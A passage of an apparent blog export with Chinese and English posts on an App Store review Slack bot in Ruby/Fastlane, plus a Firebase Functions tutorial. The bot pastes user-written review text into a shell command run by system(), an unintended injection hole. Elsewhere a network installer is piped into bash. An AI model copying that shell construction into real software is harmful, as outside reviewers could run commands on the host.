'data')['reviews'] end endend# Slack Botdef notify_slack(review) rating = review[\"rating\"].to_i color = rating &gt;= 4 ? \"good\" : (rating &gt;= 2 ? \"warning\" : \"danger\") like = review[\"helpfulViews\"].to_i &gt; 0 ? \" - #{review[\"helpfulViews\"]} :thumbsup:\" : \"\" date = review[\"edited\"] == false ? \"Created at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" : \"Updated at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" isResponse = \"\" if review[\"developerResponse\"] != nil &amp;&amp; review[\"developerResponse\"]['lastModified'] &lt; review[\"lastModified\"] isResponse = \" (客服回覆已過時)\" end edited = review[\"edited\"] == false ? \"\" : \":memo: 使用者更新評論#{isResponse}：\" stars = \"★\" * rating + \"☆\" * (5 - rating) attachments = { :pretext =&gt; edited, :color =&gt; color, :fallback =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :title =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :text =&gt; review[\"review\"], :author_name =&gt; review[\"nickname\"], :footer =&gt; \"iOS - v#{review[\"appVersionString\"]} - #{review[\"storeFront\"]} - #{date} - &lt;https://appstoreconnect.apple.com/apps/APP_ID/appstore/activity/ios/ratingsResponses|Go To App Store&gt;\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' #{$slack_web_hook}\" system(cmd, :err =&gt; File::NULL) puts \"#{review[\"id\"]} send Notify Success!\" endbegin lastModified = 0 if File.exists?(\".lastModified\") lastModifiedFile = File.open(\".lastModified\") lastModified = lastModifiedFile.read.to_i end newLastModified = lastModified isFirst = true messages = [] index = 0 breakWhile = true while breakWhile app = Spaceship::Tunes::login($appstore_account, $appstore_password) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { |review| index += 1 if isFirst isFirst = false newLastModified = review[\"value\"][\"lastModified\"] end if review[\"value\"][\"lastModified\"] &gt; lastModified &amp;&amp; lastModified != 0 # 第一次使用不發通知 messages.append(review[\"value\"]) else breakWhile = false break end } end messages.sort! { |a, b| a[\"lastModified\"] &lt;=&gt; b[\"lastModified\"] } messages.each { |message| notify_slack(message) } File.write(\".lastModified\", newLastModified, mode: \"w+\")rescue =&gt; error attachments = { :color =&gt; \"danger\", :title =&gt; \"AppStoreReviewBot Error occurs!\", :text =&gt; error, :footer =&gt; \"*因蘋果技術限制，精準評價爬取功能約每一個月需要重新登入設定，敬請見諒。\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' #{$slack_debug_web_hook}\" system(cmd, :err =&gt; File::NULL) puts errorend另外還加上了 begin…rescue (try…catch) 保護，如果有出現錯誤則發 Slack 通知我們回來檢查（多半是 session 過期）。 最後只要將此腳本加到 crontab / schedule 等排程工具定時執行即可！效果圖：免費的其他選擇 AppFollow ：使用 Public URL API (RSS)，只能說堪用吧。 feedis.io ：使用 Private URL API，需要把帳號密碼給他們。 TradeMe/ReviewMe ：自架服務(node.js)，我們原先用這個，但遇到前述問題。 JonSnow ：自架服務(GO)，支援一鍵部署到 heroku，作者： @saiday溫馨提示1.⚠️Private URL API 方法，如果用有二階段驗證的帳號，最長每 30 天都需要重新驗證才能使用且目前無解；如果有辦法生出沒二階段的帳號就可以無痛爽爽用。#important-note-about-session-duration2.⚠️不論是免費、付費、本文的自架；切勿使用開發者帳號，務必開一個獨立的 App Store Connect 帳號使用，權限只開放「Customer Support」；防止資安問題。3.Ruby 建議使用 rbenv 進行管理，因系統自帶 2.6 版容易造成衝突。4.在 macOS Catalina 如遇到 GEM、Ruby 環境錯誤問題，可參考 此回覆 解決。Problem Solved!經過以上心路歷程，更瞭解的 Slack Bot 的運作方式；還有 iOS App Store 是如何爬取評價內容的，另外也摸了下 ruby！寫起來真不錯！有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,016 Total Views Last Statistics Date: 2025-08-15 | 928 Views on Medium." }, { "title": "App Store App Reviews Bot: What You Need to Know", "url": "/posts/zrealm-dev/en/app-store-app-reviews-bot-what-you-need-to-know-cb0c68c33994/", "categories": "ZRealm Dev.", "tags": "slackbot, ios-app-development, ruby, fastlane, automator", "date": "2021-04-21 23:16:31 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版App Store App Reviews Slack Bot: What You Need to KnowUsing Ruby + Fastlane - SpaceS...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版App Store App Reviews Slack Bot: What You Need to KnowUsing Ruby + Fastlane - SpaceShip to create a Slack bot for tracking app reviews.Photo by Austin DistelIgnorance is Bliss](/assets/cb0c68c33994/1*Iv6qvrBfyv3bU1NK1hPVHg.webp){: lqip=”data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNjMiIGhlaWdodD0iMjA2Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+” }Example of AppReviewBotI recently discovered that the bot for forwarding the latest app reviews in Slack is a paid service. I always thought this feature was free. The costs range from $5 to $200 per month, as most platforms do not solely focus on the “App Review Bot” functionality; they also offer data analytics, record-keeping, centralized management, and competitor comparisons, among other services. The pricing reflects the range of services provided by each platform. However, I only want to use this specific feature, and paying for additional services feels wasteful.The ProblemInitially, I used the free and open-source tool TradeMe/ReviewMe for Slack notifications. However, this tool has not been maintained for years, and it occasionally sends outdated reviews, which can be quite alarming (many bugs have already been fixed, leading us to believe there were new issues!). The reasons for this are unclear.Thus, I considered looking for alternative tools or methods.TL;DR [2022/08/10] Update:I have now redesigned the App Reviews Bot using the brand new App Store Connect API and rebranded it as ZReviewTender — a free and open-source App Reviews monitoring bot.====2022/07/20 UpdateThe App Store Connect API now supports reading and managing Customer Reviews. The App Store Connect API natively supports accessing app reviews, eliminating the need to use Fastlane — Spaceship to retrieve reviews.Understanding the PrinciplesWith motivation in place, let’s explore the principles behind achieving our goal.Official API ❌Apple provides the App Store Connect API, but it does not include a feature for fetching reviews.[2022/07/20 Update]: The App Store Connect API now supports reading and managing Customer Reviews.Public URL API (RSS) ⚠️Apple offers a public RSS feed for app reviews RSS subscription URL, and it provides both RSS XML and JSON formats.https://itunes.apple.com/COUNTRY_CODE/rss/customerreviews/id=APP_ID/page=1/sortBy=mostRecent/json COUNTRY_CODE: Refer to this document. APP_ID: Visit the app’s webpage to get the URL: https://apps.apple.com/tw/app/APP_NAME/id 12345678, where the number after “id” is the App ID (purely numeric). page: You can request pages 1-10; requests beyond that will not be fulfilled. sortBy: Use mostRecent/json to request the latest reviews in JSON format; you can change it to mostRecent/xml for XML format.Review data is returned as follows:rss.json:{ \"author\": { \"uri\": { \"label\": \"https://itunes.apple.com/tw/reviews/id123456789\" }, \"name\": { \"label\": \"test\" }, \"label\": \"\" }, \"im:version\": { \"label\": \"4.27.1\" }, \"im:rating\": { \"label\": \"5\" }, \"id\": { \"label\": \"123456789\" }, \"title\": { \"label\": \"Awesome!\" }, \"content\": { \"label\": \"Life is worth it!\", \"attributes\": { \"type\": \"text\" } }, \"link\": { \"attributes\": { \"rel\": \"related\", \"href\": \"https://itunes.apple.com/tw/review?id=123456789&amp;type=Purple%20Software\" } }, \"im:voteSum\": { \"label\": \"0\" }, \"im:contentType\": { \"attributes\": { \"term\": \"Application\", \"label\": \"Application\" } }, \"im:voteCount\": { \"label\": \"0\" }}Advantages: Publicly accessible without authentication steps. Simple and easy to use.Disadvantages: This RSS API is outdated and has not been updated. The returned review information is minimal (no timestamp for comments, edited reviews, or responses). Occasionally encounters data corruption issues (later pages may suddenly return old data). Access is limited to a maximum of 10 pages. The biggest issue we encountered was point 3; however, it’s unclear whether this is a problem with the Bot tool we used or if there are issues with the RSS URL data.Private URL API ✅This method is somewhat unconventional, and I stumbled upon it by chance. However, after referencing other Review Bot implementations, I found that many websites use this approach, so it should be fine. I had seen tools doing this 4-5 years ago, but I didn’t delve into it at the time.Advantages: Data is the same as that in Apple’s backend. Data is complete and up-to-date. Allows for more detailed filtering. Deeply integrated app tools also use this method (AppRadar/AppReviewBot…).Disadvantages: This is not an officially published method (unconventional). Due to Apple’s implementation of two-step verification, the login session needs to be updated regularly.Step One — Sniffing the API that Loads Review Data in App Store Connect:Apple’s backend can be accessed by calling:https://appstoreconnect.apple.com/WebObjects/iTunesConnect.woa/ra/apps/APP_ID/platforms/ios/reviews?index=0&amp;sort=REVIEW_SORT_ORDER_MOST_RECENTThis endpoint retrieves the list of reviews:index = pagination offset, with a maximum of 100 entries displayed at once.Review data is returned as follows:private.json:{ \"value\": { \"id\": 123456789, \"rating\": 5, \"title\": \"Awesome!\", \"review\": \"Life is worth it!\", \"created\": null, \"nickname\": \"test\", \"storeFront\": \"TW\", \"appVersionString\": \"4.27.1\", \"lastModified\": 1618836654000, \"helpfulViews\": 0, \"totalViews\": 0, \"edited\": false, \"developerResponse\": null }, \"isEditable\": true, \"isRequired\": false, \"errorKeys\": null}After testing, I found that simply including cookie: myacinfo=&lt;Token&gt; allows us to spoof the request and retrieve data:With the API established and the required headers known, the next step is to automate the retrieval of this cookie information.Step Two — The Versatile FastlaneSince Apple now implements full Two-Step Verification, automating the login verification process has become more cumbersome. Fortunately, the clever tool Fastlane has implemented not only the official App Store Connect API but also iTMSTransporter and web authentication (including two-step verification). We can directly use the Fastlane command:fastlane spaceauth -u &lt;App Store Connect Email&gt;This command completes the web login verification (including two-step verification) and stores the cookie in the FASTLANE_SESSION file.You will receive a string similar to the following:!ruby/object:HTTP::Cookiename: myacinfo value: &lt;token&gt; domain: apple.com for_domain: true path: \"/\" secure: true httponly: true expires: max_age: created_at: 2021-04-21 20:42:36.818821000 +08:00 accessed_at: 2021-04-21 22:02:45.923016000 +08:00!ruby/object:HTTP::Cookiename: &lt;hash&gt; value: &lt;token&gt;domain: idmsa.apple.com for_domain: true path: \"/\"secure: true httponly: true expires: max_age: 2592000created_at: 2021-04-19 23:21:05.851853000 +08:00accessed_at: 2021-04-21 20:42:35.735921000 +08:00By using myacinfo = value, we can retrieve the list of reviews.Step Three — SpaceShipI initially thought Fastlane could only help us up to this point, and that we would have to manually connect the flow from Fastlane to the API. However, after some exploration, I discovered that Fastlane’s authentication module, SpaceShip, has even more powerful features!SpaceShip already includes a method for retrieving the review list: Class: Spaceship::TunesClient::get_reviews!app = Spaceship::Tunes::login(appstore_account, appstore_password)reviews = app.get_reviews(app_id, platform, storefront, versionId = '')*storefront = regionStep Four — AssemblyBoth Fastlane and SpaceShip are written in Ruby, so we will also use Ruby to create this bot tool.We can create a file named reviewBot.rb, and when compiling and executing, simply enter the following in the Terminal:ruby reviewBot.rb(*For more Ruby environment issues, please refer to the tips at the end of this document.)First, since the original get_reviews method’s parameters do not meet our needs, I want to retrieve review data for all regions and versions without filtering and with pagination support:extension.rb:# Extension Spaceship-&gt;TunesClientmodule Spaceship class TunesClient &lt; Spaceship::Client def get_recent_reviews(app_id, platform, index) r = request(:get, \"ra/apps/#{app_id}/platforms/#{platform}/reviews?index=#{index}&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT\") parse_response(r, 'data')['reviews'] end endendSo we extend the TunesClient with a method that only takes app_id, platform = 'ios' (in lowercase), and index = pagination offset.Next, we assemble the login verification and retrieve the review list:get_recent_reviews.rb:index = 0breakWhile = truewhile breakWhile app = Spaceship::Tunes::login(APPStoreConnect Email, APPStoreConnect Password) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { |review| index += 1 puts review[\"value\"] }endWe use a while loop to iterate through all pages, terminating when we reach a page with no content.Next, we need to add a record of the last review’s timestamp to only notify about the latest messages that haven’t been sent yet:lastModified.rb:lastModified = 0if File.exists?(\".lastModified\") lastModifiedFile = File.open(\".lastModified\") lastModified = lastModifiedFile.read.to_iendnewLastModified = lastModifiedisFirst = truemessages = []index = 0breakWhile = truewhile breakWhile app = Spaceship::Tunes::login(APPStoreConnect Email, APPStoreConnect Password) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { |review| index += 1 if isFirst isFirst = false newLastModified = review[\"value\"][\"lastModified\"] end if review[\"value\"][\"lastModified\"] &gt; lastModified &amp;&amp; lastModified != 0 # Do not send notifications on the first run messages.append(review[\"value\"]) else breakWhile = false break end }endmessages.sort! { |a, b| a[\"lastModified\"] &lt;=&gt; b[\"lastModified\"] }messages.each { |message| notify_slack(message)}File.write(\".lastModified\", newLastModified, mode: \"w+\")We simply use a .lastModified file to record the last execution time.*No notifications are sent on the first run to avoid flooding.Final Step: Assemble the notification message and send it to Slack:slack.rb:# Slack Botdef notify_slack(review) rating = review[\"rating\"].to_i color = rating &gt;= 4 ? \"good\" : (rating &gt;= 2 ? \"warning\" : \"danger\") like = review[\"helpfulViews\"].to_i &gt; 0 ? \" - #{review[\"helpfulViews\"]} :thumbsup:\" : \"\" date = review[\"edited\"] == false ? \"Created at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" : \"Updated at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" isResponse = \"\" if review[\"developerResponse\"] != nil &amp;&amp; review[\"developerResponse\"]['lastModified'] &lt; review[\"lastModified\"] isResponse = \" (Response is outdated)\" end edited = review[\"edited\"] == false ? \"\" : \":memo: User updated review#{isResponse}：\" stars = \"★\" * rating + \"☆\" * (5 - rating) attachments = { :pretext =&gt; edited, :color =&gt; color, :fallback =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :title =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :text =&gt; review[\"review\"], :author_name =&gt; review[\"nickname\"], :footer =&gt; \"iOS - v#{review[\"appVersionString\"]} - #{review[\"storeFront\"]} - #{date} - &lt;https://appstoreconnect.apple.com/apps/APP_ID/appstore/activity/ios/ratingsResponses|Go To App Store&gt;\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' SLACK_WEB_HOOK_URL\" system(cmd, :err =&gt; File::NULL) puts \"#{review[\"id\"]} send Notify Success!\"endSLACK_WEB_HOOK_URL = Incoming WebHook URLFinal Resultappreviewbot.rb:require \"Spaceship\"require 'json'require 'date'# Config$slack_web_hook = \"Target notification web hook URL\"$slack_debug_web_hook = \"Web hook URL for bot error notifications\"$appstore_account = \"App Store Connect Email\"$appstore_password = \"App Store Connect Password\"$app_id = \"APP_ID\"$platform = \"ios\"# Extension Spaceship-&gt;TunesClientmodule Spaceship class TunesClient &lt; Spaceship::Client def get_recent_reviews(app_id, platform, index) r = request(:get, \"ra/apps/#{app_id}/platforms/#{platform}/reviews?index=#{index}&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT\") parse_response(r, 'data')['reviews'] end endend# Slack Botdef notify_slack(review) rating = review[\"rating\"].to_i color = rating &gt;= 4 ? \"good\" : (rating &gt;= 2 ? \"warning\" : \"danger\") like = review[\"helpfulViews\"].to_i &gt; 0 ? \" - #{review[\"helpfulViews\"]} :thumbsup:\" : \"\" date = review[\"edited\"] == false ? \"Created at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" : \"Updated at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" isResponse = \"\" if review[\"developerResponse\"] != nil &amp;&amp; review[\"developerResponse\"]['lastModified'] &lt; review[\"lastModified\"] isResponse = \" (Customer response is outdated)\" end edited = review[\"edited\"] == false ? \"\" : \":memo: User updated review#{isResponse}：\" stars = \"★\" * rating + \"☆\" * (5 - rating) attachments = { :pretext =&gt; edited, :color =&gt; color, :fallback =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :title =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :text =&gt; review[\"review\"], :author_name =&gt; review[\"nickname\"], :footer =&gt; \"iOS - v#{review[\"appVersionString\"]} - #{review[\"storeFront\"]} - #{date} - &lt;https://appstoreconnect.apple.com/apps/APP_ID/appstore/activity/ios/ratingsResponses|Go To App Store&gt;\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' #{$slack_web_hook}\" system(cmd, :err =&gt; File::NULL) puts \"#{review[\"id\"]} send Notify Success!\"endbegin lastModified = 0 if File.exists?(\".lastModified\") lastModifiedFile = File.open(\".lastModified\") lastModified = lastModifiedFile.read.to_i end newLastModified = lastModified isFirst = true messages = [] index = 0 breakWhile = true while breakWhile app = Spaceship::Tunes::login($appstore_account, $appstore_password) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { |review| index += 1 if isFirst isFirst = false newLastModified = review[\"value\"][\"lastModified\"] endHere’s the translated text in naturalistic English while keeping the original markdown image source:if review[\"value\"][\"lastModified\"] &gt; lastModified &amp;&amp; lastModified != 0 # No notification on first use messages.append(review[\"value\"])else breakWhile = false breakend}messages.sort! { |a, b| a[\"lastModified\"] &lt;=&gt; b[\"lastModified\"] }messages.each { |message| notify_slack(message)}File.write(\".lastModified\", newLastModified, mode: \"w+\")rescue =&gt; error attachments = { :color =&gt; \"danger\", :title =&gt; \"AppStoreReviewBot Error Occurred!\", :text =&gt; error, :footer =&gt; \"*Due to Apple's technical limitations, the precise review scraping feature requires re-login and setup approximately every month. We appreciate your understanding.*\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' #{$slack_debug_web_hook}\" system(cmd, :err =&gt; File::NULL) puts errorendAdditionally, I’ve added a begin...rescue (try…catch) block for error protection. If an error occurs, a Slack notification will be sent to alert us to check back (most likely due to session expiration). Finally, just add this script to a crontab/scheduling tool for regular execution!Effect Screenshot:Other Free Options AppFollow: Uses Public URL API (RSS), it’s just barely usable. feedis.io: Uses Private URL API, requires you to provide your account credentials. TradeMe/ReviewMe: Self-hosted service (node.js), we initially used this but encountered the aforementioned issues. JonSnow: Self-hosted service (GO), supports one-click deployment to Heroku, author: @saidayFriendly Reminders ⚠️ For the Private URL API method, if you use an account with two-factor authentication, you will need to re-verify every 30 days at most, and currently, there is no solution; if you can create an account without two-factor authentication, you can use it without any hassle.#important-note-about-session-duration ⚠️ Whether free, paid, or self-hosted as mentioned in this article; do not use a developer account. Be sure to create a separate App Store Connect account with permissions limited to “Customer Support” to prevent security issues. It is recommended to use rbenv for Ruby management, as the system comes with version 2.6, which can cause conflicts. If you encounter GEM or Ruby environment errors on macOS Catalina, you can refer to this reply for a solution. Problem Solved!Through this journey, I gained a better understanding of how the Slack Bot operates and how the iOS App Store scrapes review content. I also got a taste of Ruby! It’s quite enjoyable to write!If you have any questions or suggestions, feel free to contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,016 Total Views Last Statistics Date: 2025-08-15 | 928 Views on Medium." }, { "title": "使用 Firebase Firestore + Functions 快速搭建可供測試的 API 服務", "url": "/posts/zrealm-dev/%E4%BD%BF%E7%94%A8-firebase-firestore-functions-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E5%8F%AF%E4%BE%9B%E6%B8%AC%E8%A9%A6%E7%9A%84-api-%E6%9C%8D%E5%8B%99-9659db1357e4/", "categories": "ZRealm Dev.", "tags": "ios-app-development, firebase, google-cloud-platform, notifications, ios", "date": "2021-03-24 01:09:34 +0800", "snippet": "使用 Firebase Firestore + Functions 快速搭建可供測試的 API 服務當推播統計遇上 Firebase Firestore + FunctionsPhoto by Carlos Muza前言推播精確統計功能最近想為 APP 導入的功能，未實作前我們只能從後端 Post 資料給 APNS/FCM 的成功與否當作推播基數並記錄推播點擊，計算出「點擊率」；但此方法其實...", "content": "使用 Firebase Firestore + Functions 快速搭建可供測試的 API 服務當推播統計遇上 Firebase Firestore + FunctionsPhoto by Carlos Muza前言推播精確統計功能最近想為 APP 導入的功能，未實作前我們只能從後端 Post 資料給 APNS/FCM 的成功與否當作推播基數並記錄推播點擊，計算出「點擊率」；但此方法其實非常不準確，基數包含許多無效裝置，APP 已刪除的（不一定會馬上失效）、關閉推播權限的在後端 Post 時都還是會得到成功的回傳。在 iOS 10 之後可以透過實踐 Notification Service Extension 在推播橫幅出現時的時機點偷偷 Call API 回傳做統計；好處是非常精準，只有在使用者推播橫幅有出現才會 Call；如果 APP 刪除、關閉通知、通知沒開橫幅，都不會有動作，橫幅等於有出現推播訊息，用此當推播基數然後再算上點擊數就能得到「精確的點擊率」。 詳細原理及實作方式可參考之前的文章：「 i OS ≥ 10 Notification Service Extension 應用 (Swift) 」 目前測試下來 APP 的 Loss 率應該是 0%，實際常見應用像是 Line 的訊息點對點加解密（推播的訊息是加密過的，在手機收到才解密然後顯示出來）。問題APP 端的功其實不大，iOS/Android 都只要實作類似的功能（但 Android 如果要考慮中國市場就比較麻煩，要為更平台實作推播框架內容）；比較大的功是後端還有 Server 的壓力處理，因為推播一次出去會同時 Call API 回傳紀錄，可能會塞爆 Server 的 max connection 如果又是使用 RDBMS 儲存記錄可能會更嚴重，如果發現統計數有 Loss 多半發生在此環節。 這邊可以以 log 寫檔案方式做紀錄，要查詢時在自行做統計顯示。 另外，後來想想一次出去同時回來的情境，數量可能沒有想像中的大；因為發推播也不會一口氣發個十萬百萬筆，也是幾筆幾筆批次發送；只要能扛住批次發出去同時回來的數量即可！Prototype因原先有問題中的考量，後端需要花功力研究修改且市場也不一定在意做出來的成效；所以想說先用能使用的資源弄個 Prototype 出來試試水溫。這邊選擇的是 APP 幾乎都會使用的 Firebase 服務，其中的 Functions 和 Firestore 功能。Firebase FunctionsFunctions 是 Google 提供的 serverless 服務，只需撰寫好程式邏輯，Google 自動幫你弄好伺服器、執行環境，也不用去管伺服器擴充及流量的問題。Firebase Functions 其實就是 Google Cloud Functions 但只能使用 JavaScript (node.js) 撰寫，沒試過但如果用 Google Cloud Functions 選擇用其他語言撰寫然後同樣 import Firebase 服務我想應該也能用。用在 API 就是我可以寫一個 node.js 檔案，得到一個實體 URL (ex: my-project.cloudfunctions.net/getUser)，自行撰寫取得 Request 資訊和給予相應的 Response 邏輯。 之前寫過一篇關於 Google Functions 的文章「 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 」 Firebase Functions 必須啟用 Blaze 專案（用多少、付多少）才能使用。Firebase FirestoreFirebase Firestore ，NoSql 資料庫，用來存放、管理數據。結合 Firebase Functions 可在 Request 時 import Firestore 進來操作資料庫，然後Response 給使用者，就能搭建簡單的 Restful API 服務！ 動手實作開始！安裝 node.js 環境這邊建議使用 NVM，node.js 版本管理工具進行安裝管理（像 python 用 pyenv）。到 NVM Github 專案複製安裝 shell script：curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.37.2/install.sh | bash如果安裝過程出現錯誤，請確認有 ~/.bashrc 或 ~/.zshrc 檔案，沒有可用 touch ~/.bashrc 或 touch ~/.zshrc 建立檔案然後再跑一下 install script。再來就可以使用 nvm install node 安裝最新版的 node.js。可下 npm --version 確認 npm 安裝成功、安裝版本：部署 Firebase Functions安裝 Firebase-tools：npm install -g firebase-tools安裝成功後，第一次使用請先輸入：firebase login完成 Firebase 登入驗證。啟動專案：firebase init記下 Firebase init 所在路徑：You're about to initialize a Firebase project in this directory:這邊可以選擇要安裝的 Firebase CLI 工具，按 「↑」「↓」進行選擇，「空白鍵」進行選擇；這邊可以只選擇「Functions」或連「Firestore」一起選擇安裝。=== Functions Setup 語言選擇「 JavaScript 」 關於「use ESLint to catch probable bugs and enforce style」語法 style 檢查 ， YES / NO 都可 。 install dependencies with npm? YES===Emulators Setup可在本地環境測試 Functions、Firestore 功能及設定，不會算在使用度且不需等到部署上線才能測試。 依個人需求安裝，我有裝但沒有用．．．因為只是小功能而已。Coding!前往上述記下的路徑，找到 functions 資料夾 ，用編輯器打開裡面的 index.js 檔案。index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');admin.initializeApp();exports.hello = functions.https.onRequest((req, res) =&gt; { const targetID = req.query.targetID const action = req.body.action const name = req.body.name res.send({\"targetID\": targetID, \"action\": action, \"name\": name}); return})貼上以上內容，我們定義了一個路徑接口 /hello 然後會回傳 URL Query ?targetID= 、 POST action 、 name 參數資訊。修改＆儲存完成後回到 console 下：firebase deploy 以後的每次修改都記得要回來下 firebase deploy 指令，才會生效。開始驗證＆部署到 Firebase…可能需要稍等一下， Deploy complete! 後你的第一個 Request &amp; Response 網頁就完成了！這時候可以回到 Firebase -&gt; Functions 頁面：就會看到剛剛撰寫的接口和網址位置。複製下方網址貼到 PostMan 測試： POST Body 記得選擇 x-www-form-urlencoded 。成功！Log我們可以在程式碼中使用：functions.logger.log(\"log:\", value);進行 Log 紀錄。並可在 Firebase -&gt; Functions -&gt; 紀錄中查看 log 結果：Example Goal 建立一個可新增、修改、刪除、查詢文章和按讚的 API我們希望能達成 Restful API 的功能設計，所以不能再使用上面範例的純 Path 方式，要改藉用 Express 框架達成。POST 新增文章index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Insertapp.post('/', async (req, res) =&gt; { // 這邊的 POST 指的是 HTTP Method POST const title = req.body.title; const content = req.body.content; const author = req.body.author; if (title == null || content == null || author == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var post = {\"title\":title, \"content\":content, \"author\": author, \"created_at\": new Date()}; await admin.firestore().collection('posts').add(post); res.status(201).send({\"message\":\"新增成功！\"});});exports.post= functions.https.onRequest(app); // 這邊的 POST 指的是 /post 路徑現在我們改用 Express 來處理網路請求，這邊先新增一個 路徑 / 的 POST 方法，最後一行表示路徑都在 /post 之下，再來我們會加上修改、刪除的 API。下 firebase deploy 部署成功後，回到 Post Man 測試：Post Man 打成功後可以再到 Firebase -&gt; Firestore 檢查一下資料是否有正確寫入：PUT 修改文章index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Updateapp.put(\"/:id\", async (req, res) =&gt; { const title = req.body.title; const content = req.body.content; const author = req.body.author; const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } else if (title == null || content == null || author == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var post = {\"title\":title, \"content\":content, \"author\": author}; await admin.firestore().collection('posts').doc(req.params.id).update(post); res.status(200).send({\"message\":\"修改成功！\"});});exports.post= functions.https.onRequest(app);部署＆測試方式如新增，Post Man Http Method 記得改成 PUT 。DELETE 刪除文章index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Deleteapp.delete(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } await admin.firestore().collection(\"posts\").doc(req.params.id).delete(); res.status(200).send({\"message\":\"文章成功！\"});})exports.post= functions.https.onRequest(app);部署＆測試方式如新增，Post Man Http Method 記得改成 DELETE 。新增、修改、刪除做完了，來做查詢！SELECT 查詢文章index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Select Listapp.get('/', async (req, res) =&gt; { const posts = await admin.firestore().collection('posts').get(); var result = []; posts.forEach(doc =&gt; { let id = doc.id; let data = doc.data(); result.push({\"id\":id, ...data}) }); res.status(200).send({\"result\":result});});// Select Oneapp.get(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } res.status(200).send({\"result\":{\"id\":doc.id, ...doc.data()}});});exports.post= functions.https.onRequest(app);部署＆測試方式如新增，Post Man Http Method 記得改成 GET 還有將 Body 切回 none 。InsertOrUpdate?有時候我們需要當值存在時做更新，當值不存在時新增，這時候可以用 set 搭配 merge: true ：index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// InsertOrUpdateapp.post(\"/tag\", async (req, res) =&gt; { const name = req.body.name; if (name == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var tag = {\"name\":name}; await admin.firestore().collection('tags').doc(name).set({created_at: new Date()}, {merge: true}); res.status(201).send({\"message\":\"新增成功！\"});});exports.post= functions.https.onRequest(app);這邊以新增 tag 為例，部署＆測試方式如新增，可以看到 Firestore 不會一直重複新增新資料。文章按讚計數器假設我們的文章資料現在多一個 likeCount 欄位紀錄按讚數量，那我們該怎麼做呢？index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = 